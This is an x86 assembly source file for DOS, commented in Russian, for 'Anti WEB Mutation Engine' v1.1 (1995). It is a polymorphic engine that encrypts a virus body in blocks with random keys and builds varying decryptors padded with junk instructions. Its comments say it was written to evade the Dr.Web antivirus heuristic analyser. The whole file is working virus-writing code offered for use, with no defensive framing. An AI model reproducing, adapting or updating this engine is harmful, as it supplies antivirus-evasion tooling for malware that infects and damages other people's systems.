;------ Anti WEB Mutation Engine by AD. version 1.1 at 18.08.95
;                                               Kazan, 1995.
awme            proc    near
;
;               Алгоритм полиморфности
;
; Зашифровывание тела вируса блоками по 100h слов
; ( эвристический анализатор WEBа 2.14 не ловит )
;
; Вход  :  DS:SI - Оригинальное тело вируса
;          ES:DI - Место, куда будет зашифровываться вирус
; {  AX  - будущее смещение вируса в сегменте при старте зараженной программы }
;          CX    - длина
;          BP    - должно быть текущее смещение вируса в сегменте
;           virstart:   call    $+3
;                       pop     bp
;                       sub     bp,3
;          В переменной NewVirOffset должно быть смещение вируса
;               относительно начала заражаемого файла
;               (для COM-файла она же и начальная длина)
;
; Выход :  ES:DI - Зашифрованное тело вируса
;          CX   - длина
;          DX   - Смещение точки входа относительно начала зашифрованного тела
;

                push    ax
                push    bx              ; сохранили handle
                push    di              ; сохранили начало буфера
                inc     cx              ; сделали длину кратной 2
                and     cx,0fffeh
                push    cx              ; сохранили точку входа

                shr     cx,1            ; разделили длину в байтах на 2
                                        ; получили длину в словах
                or      cl,cl           ; длина кратна 100h ?
                je      @@2             ; да, все блоки одинаковы
                inc     ch              ; нет, последний блок будет меньше
                                        ; CH - количество блоков
@@2:                                    ; CL - слов в последнем блоке
                mov     offset wordsinlast+1-offset start[bp],cx
                mov     dx,cx           ; сохранили

;------------------- ЦИКЛ зашифровывания блоков ----------------------------
@@4:
                mov     ax,0ffffh
                call    random          ; взять случайное число
                jz      @@4             ; ноль не годится
                push    ax              ; сохранить ключ на стеке
                mov     bx,ax           ; для дальнейшего использования
                mov     cx,100h         ; длина обычного блока
                cmp     dh,1            ; последний блок ?
                jne     @@3             ; нет
                xor     ch,ch
                mov     cl,dl           ; слов в последнем блоке
@@3:
                lodsw                   ; взяли слово
                xor     ax,bx           ; зашифровали
                stosw                   ; и записали
                loop    @@3             ; все слова в блоке
                dec     dh
                jnz     @@4             ; все блоки

;----------- Генерируем оригинальный расшифровщик -----------------
                mov     word ptr (offset origdecryptlen-offset start[bp]),origlen
                                ; установим начальную длину расшифровщика
                mov     byte ptr (offset regflag-offset start[bp]),cl
                                ; сбросим флаги
                lea     si,offset origdecrypt-offset start[bp]
                                ; в SI - адрес заготовки
;----------- Установим BX/SI/DI ------------------------------------
                mov     ax,2
                call    random          ; выбираем один из трех регистров
                mov     bl,3
                mul     bl              ; три инструкции для каждого регистра
                lea     bx,offset sidibx-offset start[bp]
                                        ; из таблицы BX будем брать инструкции
                                        ; для соответствующего регистра
                add     bx,ax
                mov     ah,[bx]
                mov     [si+2],ah       ; MOV
                mov     ah,[bx+1]
                mov     [si+6],ah       ; XOR
                mov     ah,[bx+2]
                mov     [si+8],ah       ; INC

;----------- Установим счетчик цикла ------------------------------
                mov     al,offset wordsinlast+2-offset start[bp]
                mov     bl,decryptlen
                mul     bl
                add     ax,gotostartlen
                mov     offset bothlen+1-offset start[bp],ax
                                ; общая длина расшифровщиков + блок возврата
                mov     bx,ax
                mov     ax,20h          ; Небольшой довесочек
                call    random          ; чтобы этот байт не был постоянным
                add     ax,bx
                mov     [si+1],al

;----------- Установим AH/CH/DH/AL/CL/DL ----------------------------
                mov     bx,0b0c8h               ; AL/CL/DL
                call    randomZ                 ; или
                jz      @@12
                mov     bx,0b4cch               ; AH/CH/DH
@@12:           mov     ax,0002h
                call    random
                add     bh,al
                add     bl,al
                mov     [si],bh
                mov     [si+0ah],bl
                and     bl,7h
                mov     offset regflag-offset start[bp],bl
                                        ; этот регистр портить нельзя

;----------- Установим JNE/JA/JGE/JG ------------------------------
                lea     bx,offset jnejajgejg-offset start[bp]
                mov     al,3
                call    random
                xlat
                mov     [si+0bh],al

;----------- Установим ключ для зашифровки расшифровщиков --------------
@@10:           mov     ax,00ffh
                call    random
                jz      @@10
                mov     [si+7],al
                mov     offset key+3-offset start[bp],al

;--- Перепишем созданный расшифровщик, разбавляя случайными командами --
                call    makerandomop
                movsw
                call    makerandomop
                push    di
                movsw
                movsb
                call    makerandomop
                push    di                      ; запомним, куда делать LOOP
                movsw
                movsb
                call    makerandomop
                movsb
                call    makerandomop
                movsw
                or      byte ptr (offset regflag-offset start[bp]),80h
                                ; была команда DEC - флаги портить нельзя
                call    makerandomop
                movsw

;----------- Запишем смещение для JNZ/JA/JG/JGE ---------------------
                mov     bx,di
                pop     dx
                sub     bx,dx
                neg     bx
                mov     es:[di-1],bl

;----------- Установим адрес начала расшифровки ----------------
                pop     bx
                mov     dx,offset newviroffset-offset start[bp]
                push    dx
                add     dx,di
                mov     es:[bx+1],dx

                mov     offset afterblocks+1-offset start[bp],di
                        ; сохранили адрес начала стандартных расшифровщиков
                pop     bx      ; взяли смещение вируса от начала файла

;----------- Теперь поместим расшифровщики ----------------
wordsinlast:    mov     dx,0000h
                add     bh,dh
                add     bh,dh
                sub     bh,1
                xor     ch,ch
                mov     cl,dl
                cmp     cl,0
                jnz     @@6
@@7:            mov     cx,100h
;----------- Цикл записи расшифровщиков --------------------
@@6:            lea     si,offset decrypt-offset start[bp]
                pop     ax                      ; взяли со стека ключ
                mov     [si+8],ax               ; Ключ
                mov     [si+4],bx               ; Адрес
                mov     [si+1],cx               ; Длина
                mov     cx,decryptlen
        rep     movsb

                sub     bx,200h
                dec     dh
                jnz     @@7

;----------- Запись блока возврата на программу --------------
                lea     si,offset gotostart-offset start[bp]
                inc     bh
                inc     bh
                mov     [si+1],bx
                mov     cx,gotostartlen
        rep     movsb

bothlen:        mov     cx,1234h
                                ; общая длина расшифровщиков + блок возврата
                push    cx

;----------- Зашифруем расшифровщики --------------------------------
afterblocks:    mov     di,1234h
@@11:
key:            xor     byte ptr es:[di],10h    ; ключ меняется
                inc     di
                loop    @@11

;----------- Последние вычисления - и на выход ----------------------
                pop     ax
                pop     dx
                mov     cx,dx
                add     cx,ax
                add     cx,offset origdecryptlen-offset start[bp]
                                        ; в CX - длина полученного кода
                pop     di
                pop     bx
                pop     ax
                ret

;----------- Стандартный расшифровщик ---------------------------------
decrypt:
                mov     cx,100h
                mov     di,0000h
@@1:            xor     word ptr [di],01234h
                inc     di
                inc     di
                loop    @@1

decryptlen      equ     $-offset decrypt

;------------ Блок возврата на расшифрованное тело вируса --------------
gotostart:
                mov     ax,0000h
                push    ax
                ret
gotostartlen    equ     $-offset gotostart

;------------ Заготовка оригинального расшифровщика -------------------
origdecrypt:
                mov     ah,00h                  ; mov ah/ch/dh/al/cl/dl,NN
                mov     si,0000h                ; mov si/di/bx,NNNN
@@8:            xor     byte ptr [si],00h       ; xor [si/di/bx],NN
                inc     si                      ; inc si/di/bx
                dec     ah                      ; dec ah/ch/dh/al/cl/dl
                jnz     @@8                     ; jne/ja/jge/jg NN

;------------------------ Данные -------------------------------------
origlen         equ     $-offset origdecrypt
origdecryptlen  dw      origlen                 ; начальная длина расшифровщика

sidibx          db      0bbh,037h,043h          ; таблица MOV,XOR,INC SI/DI/BX
                db      0beh,034h,046h
                db      0bfh,035h,047h
jnejajgejg      db      75h,79h,7dh,7fh         ; JNE/JA/JGE/JG
regflag         db      0                       ; флаги
autor           db      '\> [AWME] v1.1 </'
awme            endp
;----------------------------------------------------------------------

;------------- Процедура генерации случайной операции -----------------
makerandomop    proc    near
;
; Вход  : ES:DI - место записи операции
;
; Выход : нет
;
                push    ax
                push    bx
@@again:
                test    byte ptr (offset regflag-offset start[bp]),80h
                                        ; была ли операция DEC reg ?
                jnz     makemov         ; да, флаги портить нельзя
                mov     ax,2
                call    random
                jz      makemov
movdec:
                dec     ax
                jz      makeop
makedec:
                call    makerandomreg
                mov     bl,0feh
                mov     bh,al
                or      bh,0c0h
                call    randomZ
                jz      @@1
                or      bh,08h
@@1:            jmp     storeop
makeop:
                mov     ax,001fh
                call    random
                shl     al,1
                and     al,0fbh
                mov     bl,al
                call    makerandomreg
                mov     cl,3
                shl     al,cl
                or      al,0c0h
                mov     bh,al
                call    makerandomreg
                or      bh,al
                jmp     storeop
makemov:
                call    makerandomreg
                mov     bl,al
                or      bl,0b0h
                mov     ax,0ffh
                call    random
                mov     bh,al
storeop:
                mov     ax,bx
                stosw
                add     word ptr (offset origdecryptlen-offset start[bp]),2
                call    randomZ
                jnz     @@again
                pop     bx
                pop     ax
                ret

makerandomop    endp

;------------- Процедура генерации случайного кода регистра ---------
makerandomreg   proc    near
;
; Вход  : нет
;
; Выход : AL - код регистра
;
@@again:
                mov     ax,7h
                call    random
                mov     ah,offset regflag-offset start[bp]
                and     ah,07h
                cmp     ah,al           ; этот регистр уже используется ?
                je      @@again         ; да
                mov     ah,al
                and     ah,3
                cmp     ah,3            ; код регистров BH и BL не пойдет
                je      @@again
                ret

makerandomreg   endp

;----------- Случайным образом устанавливает флаг нуля Z -----------
randomZ         proc    near
;
;       Взят из NATASа
;
; Вход, выход : нет

                push    ax
                mov     ax,1
                call    random
                pop     ax
                ret
randomZ         endp

;----------- Генератор случайных чисел ---------------------------
random          proc    near
;
;       Взят из NATASа
;
; Вход  : AX - диапазон (0-AX)
; Выход : AX - случайное число

                push    ds
                push    bx
                push    cx
                push    dx
                push    ax
                xor     ax,ax
                int     1Ah
                push    cs
                pop     ds
                in      al,40h
                xchg    ax,cx
                xchg    ax,dx
                lea     bx,offset rnddata-offset start[bp]
                xor     [bx],ax
                rol     word ptr [bx],cl
                xor     cx,[bx]
                rol     ax,cl
                xor     dx,[bx]
                ror     dx,cl
                xor     ax,dx
                imul    dx
                xor     ax,dx
                xor     [bx],ax
                pop     cx
                xor     dx,dx
                inc     cx
                jz      zero
                div     cx
                xchg    ax,dx
zero:
                pop     dx
                pop     cx
                pop     bx
                pop     ds
                or      ax,ax
                retn

rnddata         db      ?,?

random          endp
